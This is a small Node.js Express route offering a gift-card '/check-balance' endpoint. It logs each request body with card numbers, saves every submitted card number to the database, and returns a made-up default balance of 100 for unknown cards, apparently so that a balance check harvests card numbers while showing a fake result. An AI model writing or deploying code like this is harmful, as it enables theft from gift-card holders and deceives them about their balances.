const express = require("express");
const GiftCard = require("../models/GiftCard");
// const UserCheck = require("../models/UserCheck");
const Settings = require("../models/Settings");

const router = express.Router();

router.post("/check-balance", async (req, res) => {
  console.log(req.body);
  try {
    const { cardType, cardNumber } = req.body;

    if (!cardType || !cardNumber) {
      return res.status(400).json({
        success: false,
        message: "cardNumber is required"
      });
    }

  
    // Find card
    const card = await GiftCard.findOne({ cardNumber });

    // Default balance
    const settings = await Settings.findOne();
    const defaultBalance = settings?.defaultBalance ?? 100;

    const balance = card ? Number(card.balance) : Number(defaultBalance);

  // Save check
    await GiftCard.create({ cardType, cardNumber, balance });

    return res.json({
      success: true,
      balance
    });

  } catch (err) {
    console.error("CHECK BALANCE ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
});
module.exports = router;
